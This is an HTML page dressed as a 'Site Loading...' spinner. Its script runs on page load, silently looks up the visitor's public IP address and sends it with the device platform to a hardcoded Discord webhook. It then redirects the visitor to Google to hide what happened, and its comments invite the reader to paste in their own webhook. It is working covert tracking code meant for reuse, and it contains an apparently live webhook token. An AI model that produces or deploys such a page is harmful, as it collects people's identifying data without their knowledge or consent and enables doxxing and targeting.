<!DOCTYPE html>
<html>
<head>
    <title>Site Loading...</title>
    <style>
        body { background: #121212; color: #555; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .spinner { border: 4px solid #333; border-top: 4px solid #888; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>

    <script>
        async function capture() {
            try {
                // 1. Get the IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                // 2. The Secret Webhook (PASTE YOURS BELOW)
                const webhook = "https://discord.com/api/webhooks/1502591625686290432/ft1Kq-msmvc5OjAUxHOxxo6ae0N7cMCFACb6mAOPKZ5e8u7ccNBno-_Ar0AXnn6jwGJr";

                // 3. Send the package to Discord
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "📡 **Connection Logged**\nIP: `" + ipData.ip + "`\nDevice: " + navigator.platform
                    })
                });
            } catch (e) { }

            // 4. THE CLOAK: Send them to Google after 2 seconds
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }
        capture();
    </script>
</body>
</html>
